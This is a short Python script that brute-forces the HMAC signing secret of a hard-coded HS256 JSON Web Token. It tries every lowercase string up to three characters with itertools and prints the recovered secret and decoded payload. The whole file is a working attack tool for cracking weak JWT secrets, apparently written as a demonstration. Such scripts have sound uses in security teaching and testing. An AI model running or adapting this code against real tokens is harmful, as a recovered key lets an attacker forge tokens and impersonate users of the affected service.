import jwt
from jwt.exceptions import InvalidSignatureError
import itertools
import string

jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
header, payload, signature = jwt_token.split('.')

charset = string.ascii_lowercase  # 'abcdefghijklmnopqrstuvwxyz'

def brute_force_attack(jwt_token, max_length):
    for length in range(1, max_length + 1):
        for attempt in itertools.product(charset, repeat=length):
            secret = ''.join(attempt)
            try:
                decoded = jwt.decode(jwt_token, secret, algorithms=['HS256'])
                print(f"Secret found: {secret}")
                print(f"Decoded JWT: {decoded}")
                return
            except InvalidSignatureError:
                continue

brute_force_attack(jwt_token, 3)
